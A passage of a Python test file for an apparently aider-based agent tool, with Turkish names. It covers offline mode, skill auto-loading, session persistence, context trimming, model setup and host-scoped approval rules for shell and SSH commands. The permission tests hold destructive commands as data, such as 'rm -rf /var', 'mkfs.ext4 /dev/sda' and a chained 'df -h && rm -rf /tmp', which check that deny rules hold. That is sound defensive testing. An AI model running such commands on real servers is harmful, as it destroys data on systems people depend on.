                    yonetici.get_model_from_cached_json_db("kurum/qwen3-coder")
            sahte.assert_not_called()
        finally:
            yonetici.offline = onceki

    def test_offline_verilmezse_hicbir_sey_degismez(self):
        from aider.args import get_parser
        from aider.main import cevrimdisi_uygula

        args = cevrimdisi_uygula(get_parser([], None).parse_args([]))
        self.assertTrue(args.check_update)


class TestMCPCevrimdisi(unittest.TestCase):
    """Ağdan paket indiren MCP sunucuları çevrimdışında başlatılmamalı."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        (self.root / ".mcp.json").write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "postgres": {
                            "command": "npx",
                            "args": ["-y", "@modelcontextprotocol/server-postgres"],
                        }
                    }
                }
            )
        )

    def tearDown(self):
        self.tmp.cleanup()

    def test_npx_sunucusu_baslatilmaz(self):
        from aider.agent.mcp import MCPManager

        yonetici = MCPManager(MagicMock(), str(self.root), offline=True)
        with patch("subprocess.Popen") as sahte:
            araclar = yonetici.load()
        sahte.assert_not_called()
        self.assertEqual(araclar, [])
        self.assertTrue(any("ağdan indirir" in e for e in yonetici.errors), yonetici.errors)

    def test_cevrimici_modda_baslatilmaya_calisilir(self):
        from aider.agent.mcp import MCPError, MCPManager

        yonetici = MCPManager(MagicMock(), str(self.root), offline=False)
        with patch("aider.agent.mcp.MCPServer.start", side_effect=MCPError("dursun")) as sahte:
            yonetici.load()
        # Çevrimdışı olmayan modda sunucu ELENMEZ; başlatılmaya çalışılır.
        sahte.assert_called_once()
        self.assertFalse(any("ağdan indirir" in e for e in yonetici.errors), yonetici.errors)


class TestVoiceCevrimdisi(unittest.TestCase):
    """Çevrimdışı modda ses kaydı dışarı gönderilmemeli.

    aider/voice.py litellm.transcription'a api_base geçirmiyor; OPENAI_API_BASE
    boşsa kayıt doğrudan api.openai.com'a gider.
    """

    def test_offline_modda_voice_reddedilir(self):
        from aider.commands import Commands

        io = MagicMock()
        coder = MagicMock()
        coder.offline = True
        komutlar = Commands(io, coder)
        komutlar.voice = None

        with patch("aider.voice.Voice") as sahte:
            komutlar.cmd_voice("")
        sahte.assert_not_called()
        hatalar = [c.args[0] for c in io.tool_error.call_args_list if c.args]
        self.assertTrue(any("Çevrimdışı" in h for h in hatalar), hatalar)


class TestFiloyaDokunanKomutlar(unittest.TestCase):
    """Filoyu etkileyen komutlar oto modda bile onay istemeli.

    DEFAULT_ASK kod tabanı odaklı yazılmıştı; ansible ve paket/servis
    komutları listede yoktu. Oto modda "ansible-playbook site.yml" tek bir
    araç çağrısıyla envanterin tamamına dokunuyordu.
    """

    def setUp(self):
        self.perms = PermissionSet(mode=MODE_AUTO)

    def _karar(self, komut, arac="Bash"):
        return self.perms.decide(arac, {"command": komut}, mutating=True)

    def test_ansible_playbook_oto_modda_sorulur(self):
        self.assertEqual(self._karar("ansible-playbook site.yml"), ASK)
        self.assertEqual(self._karar("ansible-playbook site.yml -l web01"), ASK)

    def test_ansible_adhoc_oto_modda_sorulur(self):
        self.assertEqual(self._karar("ansible all -m ping"), ASK)

    def test_uzak_ansible_da_sorulur(self):
        # Bash(...) biçimindeki sorma kuralları Ssh'ı da kapsamalı; yoksa
        # kural yerelde geçerli, sunucuda geçersiz olurdu.
        self.assertEqual(self._karar("ansible-playbook site.yml", arac="Ssh"), ASK)

    def test_paket_ve_servis_degisiklikleri_sorulur(self):
        for komut in (
            "dnf install httpd",
            "dnf update",
            "yum remove httpd",
            "systemctl restart nginx",
            "systemctl stop nginx",
        ):
            self.assertEqual(self._karar(komut), ASK, komut)

    def test_salt_okunur_komutlar_sorulmaz(self):
        # Teşhis komutları oto modda akışı kesmemeli.
        for komut in (
            "dnf list installed",
            "systemctl status nginx",
            "systemctl is-active nginx",
            "ansible-doc -l",
            "ansible-inventory --graph",
        ):
            self.assertEqual(self._karar(komut), ALLOW, komut)

    def test_kullanici_izni_varsayilan_sormayi_ezer(self):
        perms = PermissionSet(allow=["Bash(ansible-playbook:*)"], mode=MODE_AUTO)
        self.assertEqual(
            perms.decide("Bash", {"command": "ansible-playbook site.yml"}, mutating=True),
            ALLOW,
        )


class TestBeceriTetikleme(unittest.TestCase):
    """Becerilerin isteğe göre deterministik eşleştirilmesi.

    Ölçülen arıza: 14 beceri yüklüyken gemma4:e4b "skyup sunucusuna bağlan ve
    OS güncel mi diye bak" isteğinde Skill aracını bir kez bile çağırmadı.
    Katalog sistem promptunda duruyordu ama 4B sınıfı bir model onlarca
    satırdan doğru olanı seçip araç çağırmayı beceremiyor.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dizin = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def _beceri(self, ad, aciklama, govde="GÖVDE", ek=""):
        d = self.dizin / ad
        d.mkdir(parents=True, exist_ok=True)
        (d / "SKILL.md").write_text(
            f"---\nname: {ad}\ndescription: {aciklama}\n{ek}---\n\n{govde}\n",
            encoding="utf-8",
        )
        return SkillLibrary([self.dizin])

    # --- tetikleyici çıkarımı ----------------------------------------------

    def test_tirnakli_ifadeler_tetikleyici_olur(self):
        lib = self._beceri("ag-teshis", 'Ağ sorunları. "port", "firewall" isteklerinde.')
        adlar = [t for t, _ in lib.get("ag-teshis").triggers]
        self.assertIn("port", adlar)
        self.assertIn("firewall", adlar)

    def test_becerinin_adi_da_tetikleyicidir(self):
        lib = self._beceri("selinux", 'AVC kayıtları. "avc" isteklerinde.')
        self.assertIn("selinux", [t for t, _ in lib.get("selinux").triggers])

    def test_frontmatter_triggers_aciklamayi_ezer(self):
        lib = self._beceri(
            "ozel", 'Bir şey. "tirnakli" isteklerinde.', ek="triggers: elma, armut\n"
        )
        adlar = [t for t, _ in lib.get("ozel").triggers]
        self.assertIn("elma", adlar)
        self.assertIn("armut", adlar)
        self.assertNotIn("tirnakli", adlar)

    def test_kisa_tetikleyiciler_atlanir(self):
        lib = self._beceri("kisa", 'Bir şey. "ab", "cd", "uzun" isteklerinde.')
        adlar = [t for t, _ in lib.get("kisa").triggers]
        self.assertNotIn("ab", adlar)
        self.assertIn("uzun", adlar)

    # --- eşleştirme ---------------------------------------------------------

    def test_turkce_karakter_farki_eslesmeyi_bozmaz(self):
        lib = self._beceri("ag-teshis", 'Ağ. "bağlanamıyor" isteklerinde.')
        # Kullanıcı Türkçe karakter kullanmadan da yazabilir.
        self.assertTrue(lib.eslestir("sunucuya baglanamiyor"))
        self.assertTrue(lib.eslestir("sunucuya bağlanamıyor"))

    def test_ek_almis_kelime_eslesir(self):
        lib = self._beceri("ansible", 'Ansible. "playbook" isteklerinde.')
        self.assertTrue(lib.eslestir("playbook'u çalıştır"))
        self.assertTrue(lib.eslestir("playbookları listele"))

    def test_kelime_ortasinda_eslesmez(self):
        lib = self._beceri("depolama", 'Disk. "mount" isteklerinde.')
        # "paramount" içindeki "mount" tetiklememeli.
        self.assertFalse(lib.eslestir("paramount pictures"))
        self.assertTrue(lib.eslestir("mount edemiyorum"))

    def test_eslesme_yoksa_bos_doner(self):
        lib = self._beceri("ansible", 'Ansible. "playbook" isteklerinde.')
        self.assertEqual(lib.eslestir("merhaba nasılsın"), [])
        self.assertEqual(lib.eslestir(""), [])

    def test_auto_false_beceri_otomatik_yuklenmez(self):
        lib = self._beceri("elle", 'Bir şey. "elle" isteklerinde.', ek="auto: false\n")
        self.assertIn("elle", lib.skills)
        self.assertEqual(lib.eslestir("elle yapılacak iş"), [])
        # Skill aracıyla elle yüklemek hâlâ mümkün olmalı.
        ctx = make_ctx(self.dizin)
        ctx.skills = lib
        self.assertIn("GÖVDE", SkillTool().run(ctx, skill="elle"))

    # --- sıralama -----------------------------------------------------------

    def test_beceri_adi_genel_ifadeyi_yener(self):
        """Ölçülen yanlış sıralama.

        "ansible ile ... kontrol et" isteğinde kod-inceleme becerisi
        ("kontrol et", 10 karakter) ansible'ı ("ansible", 7 karakter)
        geçiyordu; en uzun eşleşmeye bakan sıralama yanlış beceriyi yüklüyordu.
        """
        (self.dizin / "ansible").mkdir()
        (self.dizin / "ansible" / "SKILL.md").write_text(
            '---\nname: ansible\ndescription: Ansible. "ansible" isteklerinde.\n---\n\nA\n'
        )
        (self.dizin / "kod-inceleme").mkdir()
        (self.dizin / "kod-inceleme" / "SKILL.md").write_text(
            '---\nname: kod-inceleme\ndescription: İnceleme. "kontrol et" isteklerinde.\n'
            "---\n\nK\n"
        )
        lib = SkillLibrary([self.dizin])
        ilk, _vurus = lib.eslestir("ansible ile ntp durumunu kontrol et", limit=1)[0]
        self.assertEqual(ilk.name, "ansible")

    def test_daha_uzman_beceri_esitligi_bozar(self):
        # "hammer" iki beceride de var; az konu iddia eden kazanmalı.
        (self.dizin / "genel").mkdir()
        (self.dizin / "genel" / "SKILL.md").write_text(
            '---\nname: genel\ndescription: Genel. "hammer", "ipa", "dnf", "repo",'
            ' "servis" isteklerinde.\n---\n\nG\n'
        )
        (self.dizin / "uzman").mkdir()
        (self.dizin / "uzman" / "SKILL.md").write_text(
            '---\nname: uzman\ndescription: Uzman. "hammer" isteklerinde.\n---\n\nU\n'
        )
        lib = SkillLibrary([self.dizin])
        ilk, _v = lib.eslestir("hammer ping çalıştır", limit=1)[0]
        self.assertEqual(ilk.name, "uzman")

    def test_cok_tetikleyici_tutan_one_gecer(self):
        (self.dizin / "az").mkdir()
        (self.dizin / "az" / "SKILL.md").write_text(
            '---\nname: az\ndescription: Az. "nginx" isteklerinde.\n---\n\nA\n'
        )
        (self.dizin / "cok").mkdir()
        (self.dizin / "cok" / "SKILL.md").write_text(
            '---\nname: cok\ndescription: Çok. "nginx", "502", "gateway" isteklerinde.\n'
            "---\n\nC\n"
        )
        lib = SkillLibrary([self.dizin])
        ilk, _v = lib.eslestir("nginx 502 bad gateway", limit=1)[0]
        self.assertEqual(ilk.name, "cok")

    # --- depodaki gerçek beceriler -----------------------------------------

    def test_gercek_isteklerde_dogru_beceri_secilir(self):
        from aider.agent.skills import YERLESIK_BECERILER

        lib = SkillLibrary([YERLESIK_BECERILER])
        beklenen = {
            "ansible ile tüm web sunucularında ntp durumunu kontrol et": "ansible",
            "disk doldu, kim yiyor?": "depolama",
            "selinux engelliyor galiba": "selinux",
            "nginx 502 veriyor": "web-sunucu",
            "bu değişikliği gözden geçir": "kod-inceleme",
        }
        for istek, ad in beklenen.items():
            eslesme = lib.eslestir(istek, limit=1)
            self.assertTrue(eslesme, f"{istek!r} hiçbir beceriyi tetiklemedi")
            self.assertEqual(eslesme[0][0].name, ad, istek)

    def test_selamlasma_beceri_tetiklemez(self):
        from aider.agent.skills import YERLESIK_BECERILER

        lib = SkillLibrary([YERLESIK_BECERILER])
        for istek in ("merhaba", "teşekkürler", "tamam"):
            self.assertEqual(lib.eslestir(istek), [], istek)


class TestOtomatikBeceriEnjeksiyonu(unittest.TestCase):
    """Eşleşen beceri gövdesi modele gerçekten ulaşmalı."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev_cwd = os.getcwd()
        os.chdir(self.root)

        beceriler = self.root / "aider-skills" / "ansible"
        beceriler.mkdir(parents=True)
        (beceriler / "SKILL.md").write_text(
            '---\nname: ansible\ndescription: Ansible işleri. "ansible", "playbook"'
            " isteklerinde tetiklenir.\n---\n\nÖNCE --list-hosts ÇALIŞTIR\n",
            encoding="utf-8",
        )

    def tearDown(self):
        os.chdir(self.prev_cwd)
        self.tmp.cleanup()

    def _coder(self, yanit, auto_skills=True):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
            auto_skills=auto_skills,
        )
        coder.auto_lint = False
        coder.auto_test = False
        self.sent = []

        def sahte(messages, functions, stream, temperature=None):
            self.sent.append(list(messages))
            return MagicMock(), FakeCompletion(FakeMessage(content=yanit))

        coder.main_model.send_completion = sahte
        return coder

    def _son_kullanici_mesaji(self):
        for msg in reversed(self.sent[0]):
            if msg.get("role") == "user":
                return msg.get("content") or ""
        return ""

    def test_eslesen_beceri_govdesi_modele_gider(self):
        coder = self._coder("tamam")
        list(coder.send_message("ansible ile ntp durumunu kontrol et"))
        icerik = self._son_kullanici_mesaji()
        self.assertIn("ÖNCE --list-hosts ÇALIŞTIR", icerik)
        self.assertIn("OTOMATİK YÜKLENEN BECERİ", icerik)
        # Kullanıcının kendi isteği kaybolmamalı.
        self.assertIn("ntp durumunu kontrol et", icerik)

    def test_arka_arkaya_iki_user_mesaji_olusmaz(self):
        # Bazı sohbet şablonları (vLLM/Qwen) ardışık user mesajında bozuluyor.
        coder = self._coder("tamam")
        list(coder.send_message("ansible playbook çalıştır"))
        roller = [m.get("role") for m in self.sent[0]]
        for onceki, sonraki in zip(roller, roller[1:]):
            self.assertFalse(onceki == sonraki == "user", roller)

    def test_beceri_govdesi_kalici_gecmise_yazilmaz(self):
        """Gövde yalnızca o turun mesaj listesine girmeli.

        Kalıcı geçmişe yazılsaydı her turda birikip bağlamı beceri
        metinleriyle doldururdu.
        """
        coder = self._coder("tamam")
        list(coder.send_message("ansible playbook çalıştır"))
        gecmis = "".join(str(m.get("content") or "") for m in coder.cur_messages)
        self.assertNotIn("ÖNCE --list-hosts ÇALIŞTIR", gecmis)
        self.assertIn("ansible playbook çalıştır", gecmis)

    def test_eslesmeyen_istekte_hicbir_sey_eklenmez(self):
        coder = self._coder("tamam")
        list(coder.send_message("merhaba"))
        self.assertNotIn("OTOMATİK YÜKLENEN BECERİ", self._son_kullanici_mesaji())

    def test_kapatilabilir(self):
        coder = self._coder("tamam", auto_skills=False)
        list(coder.send_message("ansible playbook çalıştır"))
        self.assertNotIn("OTOMATİK YÜKLENEN BECERİ", self._son_kullanici_mesaji())

    def test_yuklenen_beceri_kullaniciya_bildirilir(self):
        coder = self._coder("tamam")
        with patch.object(coder.io, "tool_output") as cikti:
            list(coder.send_message("ansible playbook çalıştır"))
        satirlar = [c.args[0] for c in cikti.call_args_list if c.args]
        self.assertTrue(any("Beceri otomatik yüklendi" in s for s in satirlar), satirlar)


class TestOturumKaydi(unittest.TestCase):
    """Oturumun diske yazılması ve kaldığı yerden sürdürülmesi.

    Upstream'in --restore-chat-history'si bu iş için kullanılamıyor: markdown
    günlüğün tamamını okuyor ve araç çağrılarını kaybediyor. Agent modunda
    geçmişin yarısı araç trafiği olduğu için bu, geçmişin yarısını atmak.
    """

    def setUp(self):
        from aider.agent.oturum import SessionStore

        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.store = SessionStore(self.root)

    def tearDown(self):
        self.tmp.cleanup()

    def _tur(self, soru, cevap="tamam"):
        return [
            dict(role="user", content=soru),
            dict(role="assistant", content=cevap),
        ]

    def test_yazilan_oturum_geri_okunur(self):
        self.store.baslat("qwen3-coder")
        self.store.ekle(self._tur("disk doldu mu"))
        okuma = SessionStoreYeni(self.root)
        oturum = okuma.son()
        self.assertIsNotNone(oturum)
        self.assertEqual(oturum.mesaj_sayisi, 2)
        self.assertIn("disk doldu mu", oturum.baslik)
        self.assertEqual(oturum.meta.get("model"), "qwen3-coder")

    def test_arac_cagrilari_korunur(self):
        """Asıl mesele bu: tool_calls ve role="tool" geri gelmeli."""
        self.store.baslat()
        self.store.ekle(
            [
                dict(role="user", content="df çalıştır"),
                dict(
                    role="assistant",
                    content="",
                    tool_calls=[
                        dict(
                            id="c1",
                            type="function",
                            function=dict(name="Bash", arguments='{"command": "df -h"}'),
                        )
                    ],
                ),
                dict(role="tool", tool_call_id="c1", name="Bash", content="/dev/sda1 %80"),
            ]
        )
        mesajlar = SessionStoreYeni(self.root).yukle(SessionStoreYeni(self.root).son())
        roller = [m["role"] for m in mesajlar]
        self.assertEqual(roller, ["user", "assistant", "tool"])
        self.assertEqual(mesajlar[1]["tool_calls"][0]["function"]["name"], "Bash")
        self.assertEqual(mesajlar[2]["tool_call_id"], "c1")
        self.assertIn("%80", mesajlar[2]["content"])

    def test_bozuk_son_satir_gerisini_bozmaz(self):
        # Program tur ortasında ölürse son satır yarım kalabilir.
        self.store.baslat()
        self.store.ekle(self._tur("ilk soru"))
        with self.store.path.open("a", encoding="utf-8") as f:
            f.write('{"role": "assist')
        oturum = SessionStoreYeni(self.root).son()
        self.assertEqual(oturum.mesaj_sayisi, 2)

    def test_yazma_hatasi_oturumu_dusurmez(self):
        self.store.baslat()
        with patch.object(Path, "open", side_effect=OSError("disk dolu")):
            self.assertFalse(self.store.ekle(self._tur("soru")))
        self.assertFalse(self.store.acik)

    def test_eski_oturumlar_budanir(self):
        from aider.agent.oturum import MAX_OTURUM, SessionStore

        dizin = self.root / ".aider" / "sessions"
        dizin.mkdir(parents=True)
        for i in range(MAX_OTURUM + 5):
            (dizin / f"2026010{i:03d}-000000.jsonl").write_text(
                '{"tip": "oturum"}\n{"role": "user", "content": "x"}\n'
            )
        SessionStore(self.root).baslat()
        self.assertLessEqual(len(list(dizin.glob("*.jsonl"))), MAX_OTURUM + 1)


def SessionStoreYeni(root):
    """Yazan örnekten bağımsız, yalnızca okuyan bir depo.

    Aynı örnekle okumak yanıltıcı olurdu: oturumlar() şu an yazılan dosyayı
    listeden çıkarıyor.
    """
    from aider.agent.oturum import SessionStore

    return SessionStore(root)


class TestOturumButcesi(unittest.TestCase):
    """Bütçe kırpması araç çağrısı çiftlerini bölmemeli.

    tool_calls taşıyan bir assistant mesajı ile ona ait role="tool"
    yanıtları ayrılırsa endpoint isteği reddediyor.
    """

    def _gecmis(self):
        mesajlar = []
        for i in range(6):
            mesajlar += [
                dict(role="user", content=f"istek {i} " + "x" * 500),
                dict(
                    role="assistant",
                    content="",
                    tool_calls=[
                        dict(
                            id=f"c{i}",
                            type="function",
                            function=dict(name="Bash", arguments="{}"),
                        )
                    ],
                ),
                dict(role="tool", tool_call_id=f"c{i}", name="Bash", content="y" * 500),
                dict(role="assistant", content=f"özet {i}"),
            ]
        return mesajlar

    def test_kirpma_user_mesajindan_baslar(self):
        from aider.agent.oturum import budala

        for butce in (1_000, 3_000, 6_000, 20_000):
            kalan = budala(self._gecmis(), butce)
            if kalan:
                self.assertEqual(kalan[0]["role"], "user", f"bütçe {butce}")

    def test_yetim_tool_mesaji_kalmaz(self):
        from aider.agent.oturum import budala

        for butce in (1_000, 2_500, 5_000, 9_000):
            kalan = budala(self._gecmis(), butce)
            acik = set()
            for msg in kalan:
                for cagri in msg.get("tool_calls") or []:
                    acik.add(cagri["id"])
                if msg["role"] == "tool":
                    self.assertIn(msg["tool_call_id"], acik, f"bütçe {butce}: yetim sonuç")

    def test_bos_gecmis_bos_doner(self):
        from aider.agent.oturum import budala

        self.assertEqual(budala([], 1000), [])

    def test_bol_butce_her_seyi_tutar(self):
        from aider.agent.oturum import budala

        gecmis = self._gecmis()
        self.assertEqual(len(budala(gecmis, 10_000_000)), len(gecmis))


class TestOturumDevamiUctanUca(unittest.TestCase):
    """Gerçek coder yazsın, ikinci coder sürdürsün."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.prev = os.getcwd()
        os.chdir(self.root)

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _coder(self, yanit="tamam", **kwargs):
        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
            **kwargs,
        )
        coder.auto_lint = False
        coder.auto_test = False
        coder.main_model.send_completion = lambda messages, functions, stream, temperature=None: (
            MagicMock(),
            FakeCompletion(FakeMessage(content=yanit)),
        )
        return coder

    def test_oturum_diske_yazilir_ve_geri_yuklenir(self):
        birinci = self._coder("ilk cevap")
        list(birinci.send_message("skyup diskini kontrol et"))
        self.assertTrue(birinci.oturumlar.path.is_file())

        ikinci = self._coder("ikinci cevap", devam=True)
        self.assertIsNotNone(ikinci.devam_edilen)
        icerik = "".join(str(m.get("content") or "") for m in ikinci.done_messages)
        self.assertIn("skyup diskini kontrol et", icerik)
        self.assertIn("ilk cevap", icerik)

    def test_devam_verilmezse_gecmis_bos(self):
        birinci = self._coder()
        list(birinci.send_message("bir şey"))
        ikinci = self._coder()
        self.assertIsNone(ikinci.devam_edilen)
        self.assertEqual(ikinci.done_messages, [])

    def test_onceki_oturum_yoksa_uyarir(self):
        from aider.io import InputOutput

        io = InputOutput(yes=True, pretty=False, fancy_input=False)
        with patch.object(io, "tool_warning") as uyari:
            from aider.coders import Coder
            from aider.models import Model

            Coder.create(
                main_model=Model("gpt-4o"),
                edit_format="agent",
                io=io,
                fnames=[],
                use_git=False,
                devam=True,
            )
        mesajlar = [c.args[0] for c in uyari.call_args_list if c.args]
        self.assertTrue(any("önceki oturum" in m for m in mesajlar), mesajlar)

    def test_devam_duyuruda_gorunur(self):
        birinci = self._coder()
        list(birinci.send_message("envanteri doğrula"))
        ikinci = self._coder(devam=True)
        satirlar = ikinci.get_announcements()
        self.assertTrue(any("Önceki oturum sürdürülüyor" in s for s in satirlar), satirlar)


class TestBaglamToparlama(unittest.TestCase):
    """Araç döngüsü içinde bağlam dolarsa eski çıktılar kısaltılmalı.

    check_tokens yalnızca döngüden ÖNCE bakıyordu; oysa bağlamı şişiren şey
    döngünün kendisi. On tur "rpm -qa" çıktısı pencereyi bitiriyor ve model
    işin ortasında sert bir API hatasıyla düşüyordu.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.prev = os.getcwd()
        os.chdir(self.tmp.name)

        from aider.coders import Coder
        from aider.io import InputOutput
        from aider.models import Model

        self.coder = Coder.create(
            main_model=Model("gpt-4o"),
            edit_format="agent",
            io=InputOutput(yes=True, pretty=False, fancy_input=False),
            fnames=[],
            use_git=False,
            stream=False,
        )

    def tearDown(self):
        os.chdir(self.prev)
        self.tmp.cleanup()

    def _gecmis(self, tur=10, boyut=5000):
        mesajlar = [dict(role="user", content="paketleri incele")]
        for i in range(tur):
            mesajlar += [
                dict(
                    role="assistant",
                    content="",
                    tool_calls=[
                        dict(
                            id=f"c{i}",
                            type="function",
                            function=dict(name="Bash", arguments="{}"),
                        )
                    ],
                ),
                dict(role="tool", tool_call_id=f"c{i}", name="Bash", content="p" * boyut),
            ]
        return mesajlar

    def test_sinir_altinda_hicbir_sey_degismez(self):
        gecmis = self._gecmis(tur=1, boyut=100)
        onceki = [dict(m) for m in gecmis]
        self.assertTrue(self.coder._baglami_toparla(gecmis))
        self.assertEqual(gecmis, onceki)

    def test_eski_arac_ciktilari_kisaltilir(self):
        gecmis = self._gecmis()
        with patch.object(self.coder, "_baglam_siniri", return_value=20_000):
            self.assertTrue(self.coder._baglami_toparla(gecmis))
        toplam = sum(len(str(m.get("content") or "")) for m in gecmis)
        self.assertLessEqual(toplam, 20_000)
        self.assertTrue(any("kısaltıldı" in str(m.get("content") or "") for m in gecmis))

    def test_arac_mesajlari_atilmaz_yetim_kalmaz(self):
        # tool mesajını tümden atmak, tool_calls taşıyan assistant mesajını
        # yanıtsız bırakır ve endpoint isteği reddeder.
        gecmis = self._gecmis()
        onceki_roller = [m["role"] for m in gecmis]
        with patch.object(self.coder, "_baglam_siniri", return_value=15_000):
            self.coder._baglami_toparla(gecmis)
        self.assertEqual([m["role"] for m in gecmis], onceki_roller)
        for msg in gecmis:
            if msg["role"] == "tool":
                self.assertTrue(msg.get("tool_call_id"))

    def test_son_mesajlar_korunur(self):
        from aider.coders.agent_coder import KORUNAN_SON_MESAJ

        gecmis = self._gecmis()
        with patch.object(self.coder, "_baglam_siniri", return_value=15_000):
            self.coder._baglami_toparla(gecmis)
        for msg in gecmis[-KORUNAN_SON_MESAJ:]:
            self.assertNotIn("kısaltıldı", str(msg.get("content") or ""))

    def test_yer_acilamazsa_false_doner(self):
        gecmis = self._gecmis(tur=2, boyut=50_000)
        with patch.object(self.coder, "_baglam_siniri", return_value=100):
            self.assertFalse(self.coder._baglami_toparla(gecmis))

    def test_pencere_bilinmiyorsa_dokunulmaz(self):
        gecmis = self._gecmis()
        onceki = [dict(m) for m in gecmis]
        with patch.object(self.coder, "_baglam_siniri", return_value=None):
            self.assertTrue(self.coder._baglami_toparla(gecmis))
        self.assertEqual(gecmis, onceki)

    def test_kullanici_bilgilendirilir(self):
        gecmis = self._gecmis()
        with patch.object(self.coder, "_baglam_siniri", return_value=20_000):
            with patch.object(self.coder.io, "tool_warning") as uyari:
                self.coder._baglami_toparla(gecmis)
        satirlar = [c.args[0] for c in uyari.call_args_list if c.args]
        self.assertTrue(any("Bağlam doluyordu" in s for s in satirlar), satirlar)


class TestSunucuKapsamliKurallar(unittest.TestCase):
    """Ssh(sunucu::komut) — kural yalnızca o sunucuda geçerli.

    Öncesinde kural yalnızca komuta göre daralıyordu: test sunucusunda
    onayladığın bir komut üretim sunucusunda da onaysız çalışıyordu.
    """

    def test_glob_ile_sunucu_kumesi(self):
        kural = Rule("Ssh(test-*::uptime)")
        self.assertTrue(kural.matches("Ssh", {"host": "test-web01", "command": "uptime"}))
        self.assertFalse(kural.matches("Ssh", {"host": "uretim01", "command": "uptime"}))

    def test_izin_karari_sunucuya_bagli(self):
        perms = PermissionSet(allow=["Ssh(skyup::systemctl restart:*)"], mode=MODE_ASK)
        izinli = dict(host="skyup", command="systemctl restart nginx")
        yasak = dict(host="uretim01", command="systemctl restart nginx")
        self.assertEqual(perms.decide("Ssh", izinli, mutating=True), ALLOW)
        self.assertEqual(perms.decide("Ssh", yasak, mutating=True), ASK)

    def test_sunucusuz_kural_her_sunucuda_gecerli(self):
        # Reddetme kurallarında istenen davranış bu.
        perms = PermissionSet(deny=["Ssh(rm -rf:*)"], mode=MODE_AUTO)
        for host in ("skyup", "uretim01", "srvsatellite"):
            self.assertEqual(
                perms.decide("Ssh", dict(host=host, command="rm -rf /var"), mutating=True),
                DENY,
            )

    def test_zincirdeki_her_parca_ayni_sunucuda_denetlenir(self):
        perms = PermissionSet(allow=["Ssh(skyup::df -h:*)"], mode=MODE_ASK)
        # İkinci parça izinli değil: tümü onaylanmamalı.
        karar = perms.decide(
            "Ssh", dict(host="skyup", command="df -h && rm -rf /tmp"), mutating=True
        )
        self.assertNotEqual(karar, ALLOW)

    def test_bash_reddi_hala_uzaga_genisler(self):
        # Bash(...) reddi sunucu kapsamı olmadan her hostu kapsamayı sürdürmeli.
        perms = PermissionSet(mode=MODE_AUTO)
        self.assertEqual(
            perms.decide("Ssh", dict(host="skyup", command="mkfs.ext4 /dev/sda"), mutating=True),
            DENY,
        )


class TestModelListeleme(unittest.TestCase):
    """Model kimliğini elle yazdırmak yerine endpoint'ten seçtirme.

    Kullanıcının geri bildirimi: "modeli eklemek çok zor oldu, otomatik
    olsaydı iyi olurdu."
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name)
        self.io = MagicMock()

    def tearDown(self):
        self.tmp.cleanup()

    def _yanitlar(self, models=None, chat=None):
        """_istek'i URL'ye göre sahtele."""

        def sahte(url, api_key, veri=None, timeout=None):
            if url.endswith("/models"):
                return models
            if url.endswith("/chat/completions"):
                return chat
            return None

        return sahte

    def test_liste_alinirsa_numarayla_secilir(self):
        from aider.agent.model_setup import run_setup

        models = {
            "data": [
                {"id": "qwen3-coder", "max_model_len": 131072},
                {"id": "llama-3.3-70b", "max_model_len": 8192},
            ]
        }
        # adres, model seçimi (2), pencere, çıktı — liste geldiği için anahtar
        # sorulmuyor.
        self.io.prompt_ask.side_effect = ["https://llm.kurum/v1", "2", "", ""]
        with patch("aider.agent.model_setup._istek", self._yanitlar(models=models)):
            ad, _yazilan = run_setup(self.io, home=self.home)
        self.assertEqual(ad, "openai/llama-3.3-70b")

    def test_pencere_endpointten_okunur(self):
        from aider.agent.model_setup import run_setup

        models = {"data": [{"id": "qwen3-coder", "max_model_len": 131072}]}
        # Pencere sorusunda boş bırakılıyor: varsayılan endpoint'ten gelmeli.
        self.io.prompt_ask.side_effect = ["https://llm.kurum/v1", "1", "", ""]
        with patch("aider.agent.model_setup._istek", self._yanitlar(models=models)):
            ad, _y = run_setup(self.io, home=self.home)
        yol = self.home / ".aider" / "model.metadata.json"
        meta = json.loads(yol.read_text(encoding="utf-8"))
        self.assertEqual(meta[ad]["max_input_tokens"], 131072)

    def test_listede_yok_secenegi_elle_yazdirir(self):
        from aider.agent.model_setup import run_setup

        models = {"data": [{"id": "qwen3-coder"}]}
        # Son seçenek "listede yok": iki model varken numara 2.
        self.io.prompt_ask.side_effect = ["https://llm.kurum/v1", "2", "ozel-model", "", ""]
        with patch("aider.agent.model_setup._istek", self._yanitlar(models=models)):
            ad, _y = run_setup(self.io, home=self.home)
        self.assertEqual(ad, "openai/ozel-model")

    def test_liste_alinamazsa_elle_girise_duser(self):
        from aider.agent.model_setup import run_setup

        # Liste hiç gelmiyor: anahtar soruluyor, sonra kimlik elle isteniyor.
        self.io.prompt_ask.side_effect = ["https://llm.kurum/v1", "k", "elle-model", "", ""]
        with patch("aider.agent.model_setup._istek", return_value=None):
            ad, _y = run_setup(self.io, home=self.home)
        self.assertEqual(ad, "openai/elle-model")
        uyarilar = [c.args[0] for c in self.io.tool_warning.call_args_list if c.args]
        self.assertTrue(any("alınamadı" in u for u in uyarilar), uyarilar)


class TestAracDestegiDenemesi(unittest.TestCase):
    """Agent modu fonksiyon çağırmaya bağlı; desteklemeyen model sessizce
    tanımlanırsa belirtisi "model hiç araç çağırmıyor" oluyor."""

    def test_arac_cagrisi_donerse_destekliyor(self):
        from aider.agent.model_setup import arac_destegi_dene

